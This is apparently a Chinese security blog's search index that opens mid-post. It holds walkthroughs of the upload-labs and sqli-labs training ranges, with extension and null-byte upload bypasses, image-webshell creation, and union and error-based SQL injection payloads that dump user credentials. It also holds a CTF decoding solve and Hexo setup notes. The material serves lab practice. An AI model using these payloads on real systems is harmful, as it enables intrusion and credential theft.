</code>,然后去掉后面的<code>.</code>，后缀就剩一个.了（不在黑名单中）</p><p>最后上传文件名是<code>1.php. </code></p><h2 id="Pass-11-双写绕过"><a href="#Pass-11-双写绕过" class="headerlink" title="Pass-11(双写绕过)"></a>Pass-11(双写绕过)</h2><p>源码变了，但依旧是黑名单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); //文件名里有黑名单的后缀就会被替换成空</span><br></pre></td></tr></table></figure><p>构造一个文件名<code>1.pphphp</code>，它是从左到右序列替换的，替换后变成1.php</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231122210501403.png" alt="image-20231122210501403"></p><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12(%00截断)"></a>Pass-12(%00截断)</h2><p>源码变了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>); <span class="comment">//白名单，允许上传的文件类型</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>save_path是一个可控变量，用%00进行截断，使用条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php版本小于5.3.4</span><br><span class="line">php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure><p>上传.png图片</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231123112643645.png" alt="image-20231123112643645"></p><p>上传后url地址是这样的</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231123113120815.png" alt="image-20231123113120815"></p><p>我们访问1.php就行了</p><h2 id="Pass-13-0x00绕过"><a href="#Pass-13-0x00绕过" class="headerlink" title="Pass-13(0x00绕过)"></a>Pass-13(0x00绕过)</h2><p>同样save_path是可控的，这个是post请求</p><p>在文件名后面随便加个字符，将它的hex编码改成00</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231123113614521.png" alt="image-20231123113614521"></p><p>访问同上</p><h2 id="Pass-14-图片🐎"><a href="#Pass-14-图片🐎" class="headerlink" title="Pass-14(图片🐎)"></a>Pass-14(图片🐎)</h2><p>准备php文件(里面是一句话木马)，和一张普通图片</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy 13.jpg /b + 13.php webshell.jpg</span><br></pre></td></tr></table></figure><p>上传图片后，利用文件包含漏洞进行执行</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231123115055264.png" alt="image-20231123115055264"></p><h2 id="Pass-15-图片🐎"><a href="#Pass-15-图片🐎" class="headerlink" title="Pass-15(图片🐎)"></a>Pass-15(图片🐎)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br></pre></td></tr></table></figure><p>getimagesize()是PHP中用于获取图像的大小和格式的函数。它可以返回一个包含图像的宽度、高度、类型和MIME类型的数组</p><p>getimagesize()的基本语法如下：</p><p>$size &#x3D; getimagesize($filename);</p><p>其中，$filename是要获取信息的图像文件的路径。该函数返回一个数组$size，数组元素如下：</p><p>$size[0]: 图像的宽度<br>$size[1]: 图像的高度<br>$size[2]: 图像的类型<br>$size[3]: 图像的MIME类型<br>$size[bits]: 图像的位深度<br>$size[channels]: 图像的通道数<br>$size[mime]: 图像的MIME类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 592</span><br><span class="line">    [1] =&gt; 387</span><br><span class="line">    [2] =&gt; 3 //一个代表图像类型的整数值，常量</span><br><span class="line">    [3] =&gt; width=&quot;592&quot; height=&quot;387&quot;</span><br><span class="line">    [bits] =&gt; 8</span><br><span class="line">    [mime] =&gt; image/png</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>该值有如下常量：</p><p>IMAGETYPE_GIF: GIF格式<br>IMAGETYPE_JPEG: JPEG格式<br>IMAGETYPE_PNG: PNG格式</p><p>上面的3就代表是png格式的图片</p><p>同样图片马绕过</p><h2 id="Pass-16-exif-imagetype"><a href="#Pass-16-exif-imagetype" class="headerlink" title="Pass-16(exif_imagetype)"></a>Pass-16(exif_imagetype)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//需要开启php_exif模块</span><br><span class="line">$image_type = exif_imagetype($filename);</span><br><span class="line">//exif_imagetype()仅检查文件的前几个字节，图片码可以绕过</span><br></pre></td></tr></table></figure><p>上传包含一句话木马的图片，然后利用文件包含漏洞执行代码</p><h2 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17(二次渲染)"></a>Pass-17(二次渲染)</h2><p>有二次渲染函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">imagecreatefromjpeg</span><br><span class="line">imagecreatefrompng</span><br><span class="line">imagecreatefromgif</span><br></pre></td></tr></table></figure><p>上传图片马之后，会将文件最后的php代码删掉</p><p>我们可以先上传图片马，然后用010和被渲染的图片进行对比，找到一样的部分（未被渲染的部分）</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231211201726976.png" alt="image-20231211201726976"></p><p>再上传就可以了</p><h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18(条件竞争)"></a>Pass-18(条件竞争)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unlink($upload_file); //文件类型不合规直接会被删除</span><br></pre></td></tr></table></figure><p>我们可以多开几个线程，在还没删除之前就执行代码</p><p>抓包上传php文件，开两个爆破页面，一个写，一个读</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231211221940410.png" alt="image-20231211221940410"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231211221951213.png" alt="image-20231211221951213"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc50</title>
      <link href="/post/2679200a.html"/>
      <url>/post/2679200a.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212338535.png" alt="image-20230403212338535"></p><p>丢进010在文件中部找到密文</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</span><br></pre></td></tr></table></figure><p>base64解码，在base32解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KEY&#123;Lazy_Man&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212707857.png" alt="image-20230403212707857"></p><p>图片大小过大，用binwalk查看</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212904989.png" alt="image-20230403212904989"></p><p>binwalk -e分离文件得到flag.zip</p><p>我的解压软件看不到提示，直接跑出zip密码：<strong>123456</strong></p><p>thienc.txt里的<strong>3078</strong>就是十六进制中的<strong>0x</strong></p><p>python脚本将thienc.txt转为十六进制文本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">number = read_file(<span class="string">&#x27;thienc.txt&#x27;</span>)</span><br><span class="line">result = []</span><br><span class="line">result.append(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, number))</span><br><span class="line">result = result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">strings =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    y = <span class="built_in">bytearray</span>.fromhex(i)</span><br><span class="line">    z = <span class="built_in">str</span>(y)</span><br><span class="line">    z= re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,z)[<span class="number">0</span>]</span><br><span class="line">    strings += z</span><br><span class="line"></span><br><span class="line">b= strings.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strings=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(i) ==<span class="number">1</span>:</span><br><span class="line">        i= <span class="string">&#x27;0&#x27;</span> + i</span><br><span class="line">    strings +=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strings)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;complete！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到文本</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403213659443.png" alt="image-20230403213659443"></p><p>注意到37 7A BC AF是<strong>7z</strong>格式压缩文件的文件头</p><p>复制文本粘贴进010<strong>（ctrl+shift+v）</strong>，将文件后缀保存为7z</p><p>得到一个加密的文档， 结合之前得到的key  解压得到secenc.txt</p><p>很明显为base64编码，但解码不对</p><p>发现这段字符串经过了多重的base64和base32混合编码。循环用正则表达式匹配判断编码类型然后解码： 脚本为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;secenc.txt&#x27;</span>).read().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[2-7A-Z=]+$&#x27;</span>, f.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        f = base64.b32decode(f)</span><br><span class="line">    <span class="keyword">elif</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[0-9a-zA-Z+/=]+$&#x27;</span>, f.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        f = base64.b64decode(f)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(f.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="built_in">str</span>(f,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decryption complete!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214329615.png" alt="image-20230403214329615"></p><p>ook编码，解码得到</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214640117.png" alt="image-20230403214640117"></p><p>brainfuck –&gt;text运行得到：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214737633.png" alt="image-20230403214737633"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/post/b3432909.html"/>
      <url>/post/b3432909.html</url>
      
        <content type="html"><![CDATA[<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><ol><li><strong>Url 地址中输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x and 1&#x3D;1 页面依旧运行正常，继续进行下一步。</strong></li><li><strong>Url 地址中继续输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x and 1&#x3D;2 页面运行错误，则说明此 Sql 注入为数字型注入。</strong></li></ol><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><ol><li><p><strong>Url 地址中输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x’ and ‘1’&#x3D;’1 页面运行正常，继续进行下一步。</strong></p><p>2.<strong>Url 地址中继续输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x’ and ‘1’&#x3D;’2 页面运行错误，则说明此 Sql 注入为字符型注入。</strong></p></li></ol><h2 id="猜解数据库中字段数"><a href="#猜解数据库中字段数" class="headerlink" title="猜解数据库中字段数"></a>猜解数据库中字段数</h2><p>​    <strong>使用 order by x 进行猜解的时候可以使用二分法进行猜解，先使用大一点的数字数字进行测试，如果报错就换数字的一半进行测试，当范围缩小时在依次测试。</strong><br> <strong>注意：</strong> <em>(–+为注释，将–+之后的语句都注释)</em></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这是字符型注入</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</span><br><span class="line"># 使用order by进行联合注入，显示字段</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+</span><br><span class="line"># 在我们回显字段，将id改成错误的值（-1，0，-2等）</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line"># 通过回显数值我们将该数值显示成数据库的名称 利用database()函数</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),3 --+</span><br><span class="line"># 获得数据库名称后，再获取数据库中的表，获取全部的表需要一个group_concat()函数</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line"># 在获得数据表以后,我们来获取users表中的列名</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line"># 获取到列名以后，我们再获取该列数据</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(username ,&#x27;:&#x27;, password) from users --+</span><br></pre></td></tr></table></figure><p>sql注入完成，下图<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/7caf5a7f70244185b669b92d2026b58f.png" alt="7caf5a7f70244185b669b92d2026b58f"></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>第二关为数字型注入和第一个一样，删除 id&#x3D;1后面的引号即可</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>第三关的注入类型是基于 ‘) 的注入，只需要把注入点改为 ‘) 就可以了。</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p> 输入单引号进行测试：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/74e406b234e645c29efa332800e9da0e.png" alt="74e406b234e645c29efa332800e9da0e"></p><p>我们发现并没有报错，那么就有可能是数据库后台把单引号过滤了，既然单引号类型被过滤了，那么我们就去测试双引号，我们输入注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/a442969c22e546bcb4de182b451511fb.png" alt="a442969c22e546bcb4de182b451511fb"></p><p>页面报错并且爆出了单括号，根据第三关的经验我们首先测试是不是基于 “) 的注入类型 ，输入注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) and 1=1 --+</span><br><span class="line">?id=1&quot;) 1=2 --+</span><br></pre></td></tr></table></figure><p>第一个显示正常，第二个不正常但无报错说明有可能是基于 “) 的注入类型，接下来我们输入ORDER BY 语句进行测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3 --+</span><br></pre></td></tr></table></figure><p>页面显示正常。。<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/bc6ba356af0f40cb9c807af291f8c9f8.png" alt="bc6ba356af0f40cb9c807af291f8c9f8"></p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>判断为字符注入，通过 ‘ 闭合查询无返回的数据，无论是有数据返回还是无数据返回页面都不会显示相关的数据。</p><p>所以这关的重点是盲注。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=-1&#x27;  %23</span><br></pre></td></tr></table></figure><p><strong>开始注入</strong></p><p>​    <strong>1.双查询注入</strong>(需要多点几下才能出效果)</p><p> <strong>爆库名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select database()), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/9a3f71c5fcf540ffbe4b7e94d7998f81.png" alt="9a3f71c5fcf540ffbe4b7e94d7998f81"></p><p> <strong>爆表名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/04fa7aee6738498a91df6a16e267265d.png" alt="04fa7aee6738498a91df6a16e267265d"></p><p><strong>爆列名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/75ca52a0302c4955a19a3d97bbd6b99c.png" alt="75ca52a0302c4955a19a3d97bbd6b99c"></p><p><strong>爆字段内容（获取用户表的账号和密码）</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select concat(username,&#x27;~&#x27;,password) from users  limit 0,1), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/5e3f5be531ef42389799d5c690d02801.png" alt="5e3f5be531ef42389799d5c690d02801"></p><p>其他账号密码更改limit后面的0为1，2，3，4就可以出来了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决博客Spawn failed</title>
      <link href="/post/83dcefb7.html"/>
      <url>/post/83dcefb7.html</url>
      
        <content type="html"><![CDATA[<p>错误如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: Spawn failed</span><br><span class="line">      at ChildProcess.&lt;anonymous&gt; (/usr/local/src/hexo/hanyubolg/node_modules/hexo-util/lib/spawn.js:51:21)</span><br><span class="line">      at ChildProcess.emit (events.js:376:20)</span><br><span class="line">      at Process.ChildProcess._handle.onexit (internal/child_process.js:277:12) &#123;</span><br><span class="line">    code: 128</span><br><span class="line">  &#125;</span><br><span class="line">&#125; Something&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></pre></td></tr></table></figure><p>解决方法</p><p>有可能是你的git repo配置地址不正确,可以将http方式变更为ssh方式，如图</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230222194656561.png" alt="image-20230222194656561"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: &#x27;git&#x27; # 这是固定的</span><br><span class="line">  repository:  #这里是你的仓库的地址，根据你自己实际的地址，进行添加</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>如果更改过一次，再更改一次即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Spawn failed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建靶场</title>
      <link href="/post/5f593b8b.html"/>
      <url>/post/5f593b8b.html</url>
      
        <content type="html"><![CDATA[<h1 id="sql-labs靶场环境搭建"><a href="#sql-labs靶场环境搭建" class="headerlink" title="sql-labs靶场环境搭建"></a>sql-labs靶场环境搭建</h1><h2 id="SQLI-LAB下载地址"><a href="#SQLI-LAB下载地址" class="headerlink" title="SQLI-LAB下载地址"></a>SQLI-LAB下载地址</h2><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h2 id="WEB环境搭建"><a href="#WEB环境搭建" class="headerlink" title="WEB环境搭建"></a>WEB环境搭建</h2><p>在安装靶场之前，我们还需要搭建web运行环境（phpstudy）：<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><h2 id="Sql-labs靶场环境搭建"><a href="#Sql-labs靶场环境搭建" class="headerlink" title="Sql-labs靶场环境搭建"></a>Sql-labs靶场环境搭建</h2><p>打开根目录</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20142815.png" alt="屏幕截图 2023-02-11 142815"></p><p>解压到WWW目录</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20142946.png" alt="屏幕截图 2023-02-11 142946"></p><p>在sqli-labs-master找到sqli-connections然后打开db-creds.inc，将$dbpass&#x3D;‘’改为$dbpass&#x3D;‘root’保存<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143139.png" alt="屏幕截图 2023-02-11 143139"></p><p> 完成后打开phpstudy，启动Apache和Mysql</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143514.png" alt="屏幕截图 2023-02-11 143514"></p><p>访问：<a href="http://127.0.0.1/sqli-labs-master/%E6%89%93%E5%BC%80%E9%A6%96%E9%A1%B5">http://127.0.0.1/sqli-labs-master/打开首页</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143625.png" alt="屏幕截图 2023-02-11 143625"></p><p>点击Setup&#x2F;reset Database for labs使其自动创建数据库，如图</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b91c8481328444a7bc8f0423b1e65c3a.png" alt="b91c8481328444a7bc8f0423b1e65c3a"></p><h1 id="Upload-labs靶场的搭建"><a href="#Upload-labs靶场的搭建" class="headerlink" title="Upload-labs靶场的搭建"></a>Upload-labs靶场的搭建</h1><p>下载源码：<a href="https://github.com/Tj1ngwe1/upload-labs">https://github.com/Tj1ngwe1/upload-labs</a></p><p>解压到WWW目录</p><p>访问：<a href="http://127.0.0.1/upload-labs-master/">http://127.0.0.1/upload-labs-master/</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20144714.png" alt="屏幕截图 2023-02-11 144714"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
